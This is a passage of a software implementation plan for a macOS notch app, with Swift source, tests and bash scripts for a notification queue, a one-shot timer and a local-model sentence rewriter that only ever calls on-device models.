        let a = "While you were away, Claude Code in proj ran 2 steps and finished.", b = "While you were away, Codex in site ran 4 steps and is still working.", c = "While you were away, Gemini CLI in docs ran 1 step and finished."
        CT.check("a nudge is one row", SKNote(id: 1, kind: "stuck.loop", text: "Claude Code has run the same step 4 times.").rows, ["Claude Code has run the same step 4 times."])
        CT.check("a recap of one agent is one row, as it is", recap([a]).rows, [a])
        CT.check("two agents: one row each, the second without the prefix", recap([a, b]).rows, [a, "Codex in site ran 4 steps and is still working."])
        CT.check("three agents are three rows", recap([a, b, c]).rows, [a, "Codex in site ran 4 steps and is still working.", "Gemini CLI in docs ran 1 step and finished."])
        CT.check("more than three rows: the third says how many more there are", recap([a, b, c, "+2 more"]).rows, [a, "Codex in site ran 4 steps and is still working.", "+3 more"])
        CT.check("a sentence from the local voice is one row", recap(["Claude Code finished two steps in proj."]).rows, ["Claude Code finished two steps in proj."])
        CT.check("a recap with nothing in it is one row, not a crash", recap([]).rows, [""])

        CT.section("the pointer is on the note: it is kept a little longer; a held note can be dropped unseen")
        var x = SidekickNotes()
        x.offer(note(1, "stuck.silent", key: "a|1"), now: 0)
        _ = x.show(1, now: 0)
        x.extendShowing(to: 30000)
        CT.check("a longer time", [x.showingExpired(now: 20000), x.showingExpired(now: 30000)], [false, true])
        x.offer(note(2, "stuck.loop", key: "a|2"), now: 0)
        x.drop(2)
        CT.check("a dropped note is gone", x.held.count, 0)

        CT.section("which views of the open island host a note")
        CT.check("a hidden or compact island hosts it, whatever its last view was", [SidekickHost.canHost(expanded: false, view: "prompt"), SidekickHost.canHost(expanded: false, view: "approval")], [true, true])
        CT.check("the views the user is only looking at", ["overview", "empty", "finished", "note", "sidekick"].map { SidekickHost.canHost(expanded: true, view: $0) }, [true, true, true, true, true])
        CT.check("never a card, the chat, a mail draft, the drop flow, the shelf or Settings", ["approval", "question", "error", "confused", "upload", "uploading", "choose", "mail", "prompt", "searching", "result", "settings", "greeting", "shelf"].filter { SidekickHost.canHost(expanded: true, view: $0) }, [])

        CT.section("the nearest deadline")
        CT.check("two deadlines: the nearer", SidekickNotes.nearest(9, 4), 4)
        CT.check("one deadline", [SidekickNotes.nearest(nil, 4), SidekickNotes.nearest(9, nil)], [4, 9])
        CT.check("none: the clock is not set", SidekickNotes.nearest(nil, nil), nil)

        CT.section("the clock: one one-shot timer, set to one deadline, moved or cancelled, never set when nothing runs")
        let hand = Hand()
        let clock = SidekickClock(now: { hand.t }, schedule: { hand.schedule($0, $1) })
        var fired = 0
        clock.onFire = { fired += 1 }
        /// "deadline / timers ever scheduled / timers waiting now", with -1 for no deadline.
        func state() -> String { "\(clock.deadline.map { Int($0) } ?? -1) / \(clock.scheduled) / \(hand.timers.count)" }
        CT.check("nothing set, nothing scheduled", state(), "-1 / 0 / 0")
        clock.set(nil)
        CT.check("set(nil) with nothing set schedules nothing", state(), "-1 / 0 / 0")
        clock.set(5000)
        CT.check("a deadline schedules one timer", state(), "5000 / 1 / 1")
        clock.set(5000)
        CT.check("the same deadline leaves the timer alone", state(), "5000 / 1 / 1")
        clock.set(8000)
        CT.check("another deadline replaces it (still one timer waiting)", state(), "8000 / 2 / 1")
        hand.advance(7999)
        CT.check("it has not fired a moment early", fired, 0)
        hand.advance(1)
        CT.check("it fires once at the deadline and is spent", [fired, hand.timers.count], [1, 0])
        CT.check("a spent clock has no deadline", state(), "-1 / 2 / 0")
        clock.set(20000)
        clock.set(nil)
        CT.check("set(nil) cancels", state(), "-1 / 3 / 0")
        hand.advance(100000)
        CT.check("a cancelled timer never fires", fired, 1)
        clock.set(.nan)
        CT.check("a deadline that is not finite sets nothing", state(), "-1 / 3 / 0")
        CT.finish()
    }
}
```

**Create `scripts/test-sidekick-notes.sh`**

```bash
#!/usr/bin/env bash
# Sidekick notes (held, shown, dropped, replaced) and the one one-shot clock, driven by hand. Pure Foundation.
set -euo pipefail
cd "$(dirname "$0")/.."
TEST_DIR="$(mktemp -d "${TMPDIR:-/tmp}/notchmeow-sidekick-notes.XXXXXX")"
trap 'rm -rf "$TEST_DIR"' EXIT
export NM_LOG_DIR="$TEST_DIR/logs"   # tests never write to ~/Library/Logs

APP=NotchBuddy/Sources/App
swiftc -swift-version 6 \
    $APP/CatMath.swift $APP/CatPresets.swift $APP/CatGeometry.swift $APP/Personality.swift $APP/CatRules.swift $APP/CatSettings.swift $APP/SidekickText.swift $APP/SidekickExplain.swift $APP/SidekickLedger.swift $APP/SidekickStuck.swift $APP/SidekickRecap.swift $APP/SidekickSettings.swift $APP/SidekickPresence.swift $APP/SidekickNotes.swift \
    tests/CatTestSupport.swift tests/SidekickNotesTests.swift \
    -o "$TEST_DIR/sidekick-notes-tests"
"$TEST_DIR/sidekick-notes-tests"
```

Then make it executable: `chmod +x scripts/test-sidekick-notes.sh`

- [ ] **Step 2: Run the test to make it fail**

Run: `bash scripts/test-sidekick-notes.sh`
Expected: FAIL. `error opening input file` for `SidekickNotes.swift`.

- [ ] **Step 3: Write the notes and the clock**

**Create `NotchBuddy/Sources/App/SidekickNotes.swift`**

```swift
import Foundation

// The sidekick's notes and its one clock. A note (a recap or a nudge) that the show gate refuses is HELD, up to 30 s for a nudge and 2 minutes for a recap, and shown if the gate opens,
// then dropped silently; a note that shows stays up for a short time and then goes away without counting as a dismissal (folding the island unseen is not one). `SidekickNotes` is only the
// bookkeeping of that, as plain values; the rules that decide are `SidekickGate` (the show gate). `SidekickClock` is the ONE one-shot timer of the whole sidekick, in the pattern of
// `CatSleepClock`: it is set to the nearest of the deadlines the sidekick has (a stuck rule falls due, a held note runs out, a shown note's time is up), re-set whenever one of them changes,
// and not set at all when nothing is running, so a hidden island with no agent costs nothing. It takes its clock and its timer from outside, so a test moves both by hand. Foundation only.

struct SKNote: Equatable, Sendable, Identifiable {
    var id: Int
    /// recap, stuck.loop, stuck.errors, stuck.waiting or stuck.silent (the five kinds of dismissal).
    var kind: String
    var text: String
    /// The facts the text was made from (a recap's): the only thing the local voice may be given.
    var facts: [SKFacts] = []
    /// The ledger key of the session a nudge is about.
    var key: String? = nil
    /// The agent a nudge or a one-agent recap is about: "Show me" brings its app forward.
    var agentId: String? = nil
    /// The away period a recap is for.
    var awaySince: Double? = nil
    /// When the note was made (ms): a nudge about a session that has moved on since is stale.
    var createdAt: Double = 0

    var isRecap: Bool { kind == "recap" }

    private static let recapPrefix = "While you were away, "

    /// The rows the island's card shows. One sentence is one row (the card wraps it onto two lines). A recap of several agents is one row for each, the first with "While you were away, " and the others
    /// without it, and at most three rows: with more than two agents the third row says how many more there are. The words themselves are the template's, or the local voice's.
    var rows: [String] {
        let lines = text.components(separatedBy: "\n").filter { !$0.isEmpty }
        guard isRecap, lines.count > 1 else { return [text] }
        let agents = lines.filter { !$0.hasPrefix("+") }
        let more = lines.filter { $0.hasPrefix("+") }.compactMap { Int($0.dropFirst().split(separator: " ").first ?? "") }.reduce(0, +)
        func bare(_ l: String) -> String {
            guard l.hasPrefix(Self.recapPrefix), let c = l.dropFirst(Self.recapPrefix.count).first else { return l }
            return c.uppercased() + l.dropFirst(Self.recapPrefix.count + 1)
        }
        let shown = agents.enumerated().map { $0.offset == 0 ? $0.element : bare($0.element) }
        if shown.count <= 3 && more == 0 { return shown }
        return Array(shown.prefix(2)) + ["+\(shown.count - 2 + more) more"]
    }
}

struct SidekickNotes: Equatable, Sendable {
    struct Held: Equatable, Sendable { var note: SKNote; var until: Double }
    struct Showing: Equatable, Sendable { var note: SKNote; var shownAt: Double; var expiresAt: Double; var seen: Bool }

    /// How long a note stays up once it shows, unless the user answers it first.
    static func showMs(for kind: String) -> Double { kind == "recap" ? 45000 : 20000 }

    var held: [Held] = []
    var showing: Showing? = nil
    var lastShownAt: Double? = nil
    /// The away period (its `awaySince`) whose recap was shown.
    var recapGivenFor: Double? = nil

    /// A note the gate may refuse is kept. A recap replaces a recap that is still held; a nudge for a session and kind that is already held or shown is not kept twice.
    mutating func offer(_ note: SKNote, now: Double) {
        if note.isRecap { held.removeAll { $0.note.isRecap } }
        else if held.contains(where: { $0.note.kind == note.kind && $0.note.key == note.key }) || (showing.map { $0.note.kind == note.kind && $0.note.key == note.key } ?? false) { return }
        held.append(Held(note: note, until: now + SidekickGate.hold(for: note.kind)))
    }

    /// The held notes whose time is up, taken out (a nudge that was never shown is not marked as given: the engine may offer it again).
    mutating func dropExpired(now: Double) -> [SKNote] {
        let gone = held.filter { now >= $0.until }.map(\.note)
        held.removeAll { now >= $0.until }
        return gone
    }

    /// The held notes in the order the gate is asked: a recap first, then the others as they came.
    var queue: [SKNote] { held.filter { $0.note.isRecap }.map(\.note) + held.filter { !$0.note.isRecap }.map(\.note) }

    /// What the gate needs to know about the note on screen.
    var visible: SKShowInput.Visible? { showing.map { SKShowInput.Visible(kind: $0.note.kind, seen: $0.seen) } }

    func recapGiven(for awaySince: Double?) -> Bool { awaySince != nil && recapGivenFor == awaySince }

    /// A held note shows now (it replaces the one on screen when the gate said so).
    mutating func show(_ id: Int, now: Double) -> SKNote? {
        guard let i = held.firstIndex(where: { $0.note.id == id }) else { return nil }
        let note = held.remove(at: i).note
        showing = Showing(note: note, shownAt: now, expiresAt: now + Self.showMs(for: note.kind), seen: false)
        lastShownAt = now
        if note.isRecap { recapGivenFor = note.awaySince }
        return note
    }

    /// The island is open on the note: the user has seen it.
    mutating func markSeen() { if showing != nil { showing!.seen = true } }

    /// The note on screen goes (answered, or its time is up). It returns the note; whether that counts as a dismissal is the caller's.
    mutating func retire() -> SKNote? {
        defer { showing = nil }
        return showing?.note
    }

    /// The note on screen has run out its time. Held back (false) while `holdOn` says the pointer is on it.
    func showingExpired(now: Double) -> Bool { showing.map { now >= $0.expiresAt } ?? false }

    /// The note on screen is kept a little longer (the pointer is on it).
    mutating func extendShowing(to at: Double) { if showing != nil { showing!.expiresAt = at } }

    /// A held note is dropped without ever showing (its kind is muted, or the switch is off).
    mutating func drop(_ id: Int) { held.removeAll { $0.note.id == id } }

    /// A nudge's words changed in place (the waiting nudge at the app's give-up time): it is not a second nudge.
    mutating func retext(kind: String, key: String?, text: String) {
        for i in held.indices where held[i].note.kind == kind && held[i].note.key == key { held[i].note.text = text }
        if showing?.note.kind == kind && showing?.note.key == key { showing!.note.text = text }
    }

    /// The nearer of two deadlines (nil is no deadline): the one-shot clock is set to the nearest deadline the sidekick has, from the stuck rules and from the notes.
    static func nearest(_ a: Double?, _ b: Double?) -> Double? { [a, b].compactMap { $0 }.min() }

    /// The nearest time something here must be looked at again: a held note runs out, or the note on screen has had its time. nil when there is nothing.
    var nextDeadline: Double? { (held.map(\.until) + (showing.map { [$0.expiresAt] } ?? [])).min() }
}

/// The one-shot timer. `set(at)` makes `at` (ms on the sidekick's clock) the only deadline: a different one cancels and replaces the timer, the same one leaves it alone, and nil cancels it.
@MainActor
final class SidekickClock {
    typealias Cancel = () -> Void

    private let now: () -> Double
    private let schedule: (_ afterMs: Double, _ fire: @escaping @MainActor @Sendable () -> Void) -> Cancel
    private var cancel: Cancel?
    /// The time the timer is set for, nil when it is not set.
    private(set) var deadline: Double?
    /// How many timers were scheduled in all: a test proves a hidden island with nothing running schedules none.
    private(set) var scheduled = 0
    /// Called when the deadline has come. The timer is spent by then; the caller sets the next one.
    var onFire: (() -> Void)?

    init(now: @escaping () -> Double, schedule: @escaping (Double, @escaping @MainActor @Sendable () -> Void) -> Cancel) {
        self.now = now; self.schedule = schedule
    }

    func set(_ at: Double?) {
        guard at != deadline else { return }
        cancel?(); cancel = nil; deadline = nil
        guard let at, at.isFinite else { return }
        deadline = at
        scheduled += 1
        cancel = schedule(max(0, at - now())) { [weak self] in self?.fire() }
    }

    private func fire() {
        cancel = nil
        guard let at = deadline else { return }
        let rest = at - now()
        if rest > 1 { scheduled += 1; cancel = schedule(rest) { [weak self] in self?.fire() }; return }   // the timer was early: wait for the rest
        deadline = nil
        onFire?()
    }
}

/// Which views of the open island may host a note: the ones the user is only looking at. A note never covers a card, a question, the chat, a mail draft, the drop flow or Settings; it waits
/// for the gate (and is dropped silently when its time is up). A hidden or compact island hosts it: the note opens it the way a finished task does.
enum SidekickHost {
    static let views: Set<String> = ["overview", "empty", "finished", "note", "sidekick"]

    static func canHost(expanded: Bool, view: String) -> Bool { !expanded || views.contains(view) }
}
```

- [ ] **Step 4: Run the test to make it pass**

Run: `bash scripts/test-sidekick-notes.sh`
Expected: PASS. Six headings, 52 `✓` lines in all, then `All tests passed.`

Bite it once: `sed -i '' 's/kind == "recap" ? 45000 : 20000/kind == "recap" ? 45000 : 10000/' NotchBuddy/Sources/App/SidekickNotes.swift && bash scripts/test-sidekick-notes.sh 2>&1 | grep -E "✗|failed"`. Expected: `✗ a nudge stays 20 s`, `✗ the deadline is its time` and `2 test(s) failed.` Undo it with the reverse `sed` and run the test again.

- [ ] **Step 5: Commit**

```bash
cd NotchBuddy && xcodegen > /dev/null && cd ..
```

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): the notes, the hosting rule and the one one-shot clock

Held notes are dropped silently when their time is up, a shown note goes by itself, a note is hosted only where the user is just looking, and SidekickClock is the sidekick's single timer, set only while something waits for a deadline.

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/SidekickNotes.swift tests/SidekickNotesTests.swift scripts/test-sidekick-notes.sh NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj
git commit -F "$MSG"
```

---

### Task 8: The local voice: the sanity check and the one-shot request

**Agent:** `nm-implementer-light` (Haiku 5.5, medium).

**Files:**
- Create: `NotchBuddy/Sources/App/SidekickVoice.swift`, `NotchBuddy/Sources/App/SidekickVoiceLocal.swift`, `tests/SidekickVoiceTests.swift`, `scripts/test-sidekick-voice.sh`

**Interfaces:**
- Consumes: Task 4's `SKFacts`, Task 2's `SidekickLedger.ringMax`, Task 1's `Rx`; the AI core (`NotchBuddy/Sources/App/AI/Core/*.swift` and `AppLog.swift`: `ModelRouter.localChoice`, `RouteInput`, `LocalCandidate`, `ModelRef`, `ChatRequest`, `ChatTarget`, `ModelProvider`, `ReplyAccumulator`); F1-0's `acceptNicerLine` and `tests/fixtures/sidekick/voice-cases.json` (a list of `{line, facts, ok}`).
- Produces: `SidekickVoice` (`timeoutMs`, `maxCharacters`, `maxPromptCharacters`, `system`, `prompt(lines:)`, `accept(_:facts:)`) and `SidekickVoiceLocal` (`choice(localReady:lastUsedLocal:appleReady:)`, `request(model:prompt:)`, `nicerLine(lines:facts:candidate:provider:timeoutMs:)`). Tasks 9, 14 and 19 read them.

The template is always shown first and is always right; a local model may offer a nicer sentence. **Only a model that runs on this computer is ever asked**: a candidate whose placement is `local` (a server on `127.0.0.1`, `::1` or `localhost`, and Apple on-device), picked by the router's own `localChoice` (the last used, else the first ready, else Apple) with no cloud keys, and **never** by a feature's Auto choice, which could pick a cloud model; there is no `AIFeature.cats`. A `network` or `cloud` candidate is refused twice, in `choice` and again in `nicerLine`, and so is a provider that says it is not local. It is one request, not a conversation: one user message with one text part, no tools, no web search, nothing stored. The model is given only the template's own lines, which hold an agent's name, a project's basename, counts, up to three file basenames and the state in words (under 800 characters, because Apple's on-device model holds a few thousand tokens). The sentence replaces the template only if `accept` says so: one line of at most 200 characters, no URL, no `/` or `\`, no backtick and no markdown, only numbers that are in the facts, and the name of an agent of the facts. Any error, a silence of 6 s or a failed check leaves the template.

- [ ] **Step 1: Write the failing test**

The program replays the 39 sentences of the fixture, checks the prompt's size (a line too long for the budget gives no prompt; lines that do not all fit are cut from the end), the choice of model (a network or cloud candidate is never chosen, even alone; the last used local one comes first), and runs `nicerLine` against **fake providers that record every request**: one request, to the local fake and none to the remote one; a network, a cloud candidate and a provider that says it is cloud are never asked; a made-up number, a path, an error, a model that never answers (150 ms in the test) and a no-candidate leave the template; a `<think>` block is not part of the sentence.

**Create `tests/SidekickVoiceTests.swift`**

```swift
import Foundation

// The sanity check against tests/fixtures/sidekick/voice-cases.json, the prompt's size, and the local voice with fake providers that record every request: only a local model is asked, a cloud
// or network one never is, a slow or odd answer leaves the template, and the request holds the template's words and nothing else. Run through scripts/test-sidekick-voice.sh.

final class Recorder: @unchecked Sendable {
    private let lock = NSLock()
    private var items: [ChatRequest] = []
    func add(_ r: ChatRequest) { lock.withLock { items.append(r) } }
    var all: [ChatRequest] { lock.withLock { items } }
}

/// A provider that records the request and answers with `reply` (or never answers, or fails).
struct FakeProvider: ModelProvider {
    enum Mode: Sendable { case reply(String), hang, fail }
    let id: AIProviderID
    let placement: AIPlacement
    let recorder: Recorder
    let mode: Mode
    var displayName: String { "fake \(placement.rawValue)" }
    func listModels() async throws -> [ModelInfo] { [] }
    func stream(_ request: ChatRequest) -> AsyncThrowingStream<ChatChunk, Error> {
        recorder.add(request)
        return AsyncThrowingStream { c in
            switch mode {
            case .reply(let t): c.yield(.text(t)); c.yield(.finish(.stop)); c.finish()
            case .hang: break
            case .fail: c.finish(throwing: AIError(kind: .unreachable))
            }
        }
    }
}

@main
enum SidekickVoiceTests {
    static func rows(_ x: Any?) -> [[String: Any]] { x as! [[String: Any]] }

    @MainActor static func main() async {
        let fx = CT.fixture("voice-cases.json", dir: "sidekick")
        let cases = rows(fx["cases"])
        CT.section("acceptNicerLine: \(cases.count) cases")
        var diffs: [String] = []
        for c in cases where SidekickVoice.accept(c["line"], facts: c["facts"]) != (c["ok"] as! Bool) { diffs.append(c["name"] as! String) }
        CT.checkRows("every sentence is accepted or refused as the fixture says", diffs)

        CT.section("the prompt")
        let facts = [SKFacts(agent: "Claude Code", agentId: "integration_claude", project: "proj", steps: 12, stepsAtLeast: false, files: ["a.js"], more: 0, errors: 0, approvals: 0, end: "finished", quietMinutes: 0)]
        let line = "While you were away, Claude Code in proj ran 12 steps, edited a.js, and finished."
        let p = SidekickVoice.prompt(lines: [line])!
        CT.checkTrue("it holds the template's line", p.contains(line))
        CT.checkTrue("and is under 800 characters", p.count <= 800)
        CT.check("a line too long for the budget gives no prompt", SidekickVoice.prompt(lines: [String(repeating: "x", count: 900)]), nil)
        CT.checkTrue("lines that do not all fit are cut from the end", SidekickVoice.prompt(lines: [line, String(repeating: "y", count: 790)])!.contains(line) && !SidekickVoice.prompt(lines: [line, String(repeating: "y", count: 790)])!.contains("yyy"))

        CT.section("which model: only a local one, by the router's own local choice")
        let ollama = LocalCandidate(provider: .ollama, model: "qwen", placement: .local, serverID: "ollama")
        let lan = LocalCandidate(provider: .custom, model: "big", placement: .network, serverID: "custom-1")
        let cloud = LocalCandidate(provider: .anthropic, model: "c", placement: .cloud)
        CT.check("a local server is chosen", SidekickVoiceLocal.choice(localReady: [ollama], lastUsedLocal: nil, appleReady: false)?.model, "qwen")
        CT.check("a server on the network is never chosen, even alone", SidekickVoiceLocal.choice(localReady: [lan], lastUsedLocal: nil, appleReady: false), nil)
        CT.check("nor a cloud one", SidekickVoiceLocal.choice(localReady: [cloud, lan], lastUsedLocal: nil, appleReady: false), nil)
        CT.check("the local one wins over a network one listed first", SidekickVoiceLocal.choice(localReady: [lan, ollama], lastUsedLocal: ModelRef(provider: .custom, model: "big", serverID: "custom-1"), appleReady: false)?.model, "qwen")
        CT.check("Apple on-device when nothing else is local", SidekickVoiceLocal.choice(localReady: [lan], lastUsedLocal: nil, appleReady: true)?.provider, .apple)
        CT.check("the last used local model comes first", SidekickVoiceLocal.choice(localReady: [ollama, LocalCandidate(provider: .lmstudio, model: "other", placement: .local, serverID: "lmstudio")], lastUsedLocal: ModelRef(provider: .lmstudio, model: "other"), appleReady: false)?.model, "other")

        CT.section("the local voice: one request, to a local model, with the template's words only")
        let local = Recorder(), remote = Recorder()
        func make(_ reply: FakeProvider.Mode) -> @Sendable (ChatTarget) -> any ModelProvider {
            { t in FakeProvider(id: t.provider, placement: t.placement, recorder: t.placement == .local ? local : remote, mode: reply) }
        }
        let nice = "Claude Code finished 12 steps in proj and edited a.js."
        let got = await SidekickVoiceLocal.nicerLine(lines: [line], facts: facts, candidate: ollama, provider: make(.reply(nice)))
        CT.check("a good sentence replaces the template", got, nice)
        CT.check("exactly one request, to the local fake", [local.all.count, remote.all.count], [1, 0])
        let sent = local.all[0]
        CT.check("it is one user message with one text part", sent.messages.count == 1 && sent.messages[0].parts.count == 1, true)
        CT.checkTrue("the text is the prompt: the template's line and nothing of the work", { if case .text(let t) = sent.messages[0].parts[0] { return t == p } else { return false } }())
        CT.check("no tools, no web search, no response format", sent.tools.isEmpty && !sent.webSearch && sent.responseFormat == nil, true)
        CT.check("a network candidate is never asked", await SidekickVoiceLocal.nicerLine(lines: [line], facts: facts, candidate: lan, provider: make(.reply(nice))), nil)
        CT.check("nor a cloud one", await SidekickVoiceLocal.nicerLine(lines: [line], facts: facts, candidate: cloud, provider: make(.reply(nice))), nil)
        CT.check("and neither received a request", remote.all.count, 0)
        CT.check("a provider that says it is not local is not used", await SidekickVoiceLocal.nicerLine(lines: [line], facts: facts, candidate: ollama, provider: { t in FakeProvider(id: t.provider, placement: .cloud, recorder: remote, mode: .reply(nice)) }), nil)
        CT.check("it did not even stream", remote.all.count, 0)
        CT.check("no candidate: the template stands", await SidekickVoiceLocal.nicerLine(lines: [line], facts: facts, candidate: nil, provider: make(.reply(nice))), nil)
        CT.check("a sentence with a made-up number is refused", await SidekickVoiceLocal.nicerLine(lines: [line], facts: facts, candidate: ollama, provider: make(.reply("Claude Code finished 13 steps."))), nil)
        CT.check("a sentence with a path is refused", await SidekickVoiceLocal.nicerLine(lines: [line], facts: facts, candidate: ollama, provider: make(.reply("Claude Code edited src/a.js."))), nil)
        CT.check("an error leaves the template", await SidekickVoiceLocal.nicerLine(lines: [line], facts: facts, candidate: ollama, provider: make(.fail)), nil)
        let t0 = Date()
        CT.check("a model that never answers leaves the template after the timeout", await SidekickVoiceLocal.nicerLine(lines: [line], facts: facts, candidate: ollama, provider: make(.hang), timeoutMs: 150), nil)
        CT.checkTrue("and does not wait longer than that", Date().timeIntervalSince(t0) < 2)
        CT.check("a reasoning block is not part of the sentence", await SidekickVoiceLocal.nicerLine(lines: [line], facts: facts, candidate: LocalCandidate(provider: .ollama, model: "qwen", placement: .local), provider: make(.reply("<think>12 steps? 99</think>" + nice))), nice)
        CT.finish()
    }
}
```

**Create `scripts/test-sidekick-voice.sh`**

```bash
#!/usr/bin/env bash
# Sidekick local voice: the sanity check (voice-cases.json), the prompt, and the one-shot request to a local model against fake providers that record every request. AI core only; no app.
set -euo pipefail
cd "$(dirname "$0")/.."
TEST_DIR="$(mktemp -d "${TMPDIR:-/tmp}/notchmeow-sidekick-voice.XXXXXX")"
trap 'rm -rf "$TEST_DIR"' EXIT
export NM_LOG_DIR="$TEST_DIR/logs"   # tests never write to ~/Library/Logs

APP=NotchBuddy/Sources/App
swiftc -swift-version 6 \
    $APP/AI/Core/*.swift $APP/AppLog.swift \
    $APP/SidekickText.swift $APP/SidekickExplain.swift $APP/SidekickLedger.swift $APP/SidekickStuck.swift $APP/SidekickRecap.swift $APP/SidekickVoice.swift $APP/SidekickVoiceLocal.swift \
    tests/CatTestSupport.swift tests/SidekickVoiceTests.swift \
    -o "$TEST_DIR/sidekick-voice-tests"
"$TEST_DIR/sidekick-voice-tests"
```

Then make it executable: `chmod +x scripts/test-sidekick-voice.sh`

- [ ] **Step 2: Run the test to make it fail**

Run: `bash scripts/test-sidekick-voice.sh`
Expected: FAIL. `error opening input file` for `SidekickVoice.swift` and `SidekickVoiceLocal.swift`.

- [ ] **Step 3: Write the sanity check and the request**

**Create `NotchBuddy/Sources/App/SidekickVoice.swift`**

```swift
import Foundation

// The sidekick's local voice, the pure part: the sanity check that guards the swap of a template for a sentence a local model wrote (`acceptNicerLine`), and the short prompt the model is given.
// Port of `acceptNicerLine` in `shared/sidekick-core.js` (the tie-breaker); tests/fixtures/sidekick/voice-cases.json pins it and docs/SIDEKICK-CONTRACT.md explains it. The template is always
// shown first and is always right; a nicer sentence replaces it only if it is one line of at most 200 characters, with no URL, no `/` or `\`, no backtick and no markdown, uses only numbers
// that are in the facts, and names an agent of the facts. The model is given the template's own words, which hold only the facts (the agent's name, the project's basename, counts, up to three
// file basenames and the state in words): never a command, a path, a prompt or an assistant message. Pure Foundation.

enum SidekickVoice {
    /// The local model has this long; after it the template stands.
    static let timeoutMs = 6000.0
    static let maxCharacters = 200
    /// The prompt stays under this, because Apple's on-device model holds only a few thousand tokens.
    static let maxPromptCharacters = 800
    static let system = "You rewrite one short status line from a coding assistant into one friendly sentence. Keep every name and every number exactly as given. Never add numbers, links, file paths or markdown. Reply with the sentence only."

    /// The prompt: one instruction and the template's lines (which hold only the facts). nil when even one line does not fit.
    static func prompt(lines: [String]) -> String? {
        let head = "Say this in one short, friendly sentence of at most \(maxCharacters) characters. Keep every name and number exactly as it is. Add no numbers, links, paths or markdown.\n\n"
        var kept = lines
        while !kept.isEmpty {
            let p = head + kept.joined(separator: "\n")
            if p.count <= maxPromptCharacters { return p }
            kept.removeLast()
        }
        return nil
    }

    private static func allowedNumbers(_ list: [[String: Any]]) -> Set<String> {
        var allowed = Set<String>()
        func strip(_ d: String) -> String { d.replacingOccurrences(of: "^0+(?=[0-9])", with: "", options: .regularExpression) }
        func walk(_ v: Any?) {
            guard let v, !(v is NSNull) else { return }
            if let n = v as? NSNumber {
                if CFGetTypeID(n) == CFBooleanGetTypeID() { return }
                let d = n.doubleValue
                if d.isFinite { allowed.insert(String(Int64(min(abs(d.rounded(.towardZero)), 1e18)))) }
            } else if let s = v as? String { for m in Rx.all("[0-9]+", s) { if let d = m[0] { allowed.insert(strip(d)) } } }
            else if let a = v as? [Any] { allowed.insert(String(a.count)); a.forEach(walk) }
            else if let o = v as? [String: Any] { o.values.forEach(walk) }
        }
        for f in list {
            walk(f)
            if let files = f["files"] as? [Any], let more = f["more"] as? NSNumber { allowed.insert(String(files.count + more.intValue)) }
            if (f["stepsAtLeast"] as? NSNumber).map({ CFGetTypeID($0) == CFBooleanGetTypeID() && $0.boolValue }) == true { allowed.insert(String(SidekickLedger.ringMax)) }
        }
        return allowed
    }

    /// Whether a sentence from a local model may replace the template. `facts` is the `facts` of a recap or a status: a list of facts, or one fact (anything else is no facts).
    static func accept(_ line: Any?, facts: Any?) -> Bool {
        guard let line = line as? String else { return false }
        let t = line.trimmingCharacters(in: .whitespacesAndNewlines)
        let list = (facts as? [Any])?.compactMap { $0 as? [String: Any] } ?? (facts as? [String: Any]).map { [$0] } ?? []
        if t.isEmpty || t.unicodeScalars.count > maxCharacters || list.isEmpty { return false }
        if Rx.test("[\\r\\n\u{2028}\u{2029}]", t) || Rx.test("://|\(Rx.wordStart)www\\.", t, .caseInsensitive) || Rx.test("[/\\\\`]", t) || Rx.test("[*_#\\[\\]<>|~]", t) || Rx.test("^[-+]\\s", t) { return false }
        let allowed = allowedNumbers(list)
        for m in Rx.all("[0-9]+", t) {
            guard let d = m[0] else { continue }
            if !allowed.contains(d.replacingOccurrences(of: "^0+(?=[0-9])", with: "", options: .regularExpression)) { return false }
        }
        let lower = t.lowercased()
        return list.contains { f in (f["agent"] as? String).map { !$0.isEmpty && lower.contains($0.lowercased()) } ?? false }
    }
}
```

**Create `NotchBuddy/Sources/App/SidekickVoiceLocal.swift`**

```swift
import Foundation

// The sidekick's local voice, the part that asks a model: ONE short request to a model that runs on this computer, and nothing else. Which model: only one whose placement is `local` (a server on
// 127.0.0.1, ::1 or localhost, and Apple on-device), picked by the router's own local choice (the last used, else the first ready, else Apple), never by a feature's Auto choice, which could pick a
// cloud model. There is no `AIFeature.cats`. It is a one-shot request, not a conversation: nothing is stored, and the chat's history is untouched. It returns nil (and the template stands) when there
// is no local model, on any error, after `SidekickVoice.timeoutMs`, or when the sentence fails the sanity check. It takes its provider from outside, so a test hands it fakes that record every
// request. Compiled with the AI core only (no AppState).

enum SidekickVoiceLocal {
    /// The model the voice may use among those the app found. A candidate that is not local is never considered, whatever the router would do with it.
    static func choice(localReady: [LocalCandidate], lastUsedLocal: ModelRef?, appleReady: Bool) -> LocalCandidate? {
        let local = localReady.filter { $0.placement == .local }
        return ModelRouter.localChoice(RouteInput(setting: .auto, keys: [], online: false, localReady: local, lastUsedLocal: lastUsedLocal, appleReady: appleReady))
    }

    /// The request the model gets: the system line and the one prompt, with the local reply cap.
    static func request(model: String, prompt: String) -> ChatRequest {
        ChatRequest(model: model, system: SidekickVoice.system, messages: [.init(role: .user, parts: [.text(prompt)])], maxTokens: 160)
    }

    /// A nicer sentence for the template `lines` made from `facts`, or nil. `candidate` is `choice(...)`'s answer.
    static func nicerLine(lines: [String], facts: [SKFacts], candidate: LocalCandidate?, provider: @Sendable (ChatTarget) -> any ModelProvider, timeoutMs: Double = SidekickVoice.timeoutMs) async -> String? {
        guard let c = candidate, c.placement == .local, let prompt = SidekickVoice.prompt(lines: lines) else { return nil }
        let target = ChatTarget(provider: c.provider, model: c.model, placement: .local, serverID: c.serverID)
        let model = provider(target)
        guard model.placement == .local else { return nil }
        let stream = model.stream(request(model: c.model, prompt: prompt))
        let text: String? = await withTaskGroup(of: String?.self) { group in
            group.addTask {
                var acc = ReplyAccumulator(stripsThinkBlocks: target.stripsThinkBlocks)
                do { for try await chunk in stream { acc.add(chunk) } } catch { return nil }
                return acc.error == nil ? acc.visibleText : nil
            }
            group.addTask {
                try? await Task.sleep(nanoseconds: UInt64(max(0, timeoutMs) * 1_000_000))
                return nil
            }
            let first = await group.next() ?? nil
            group.cancelAll()
            return first
        }
        guard let text else { return nil }
        let line = text.trimmingCharacters(in: .whitespacesAndNewlines)
        return SidekickVoice.accept(line, facts: facts.map(\.json)) ? line : nil
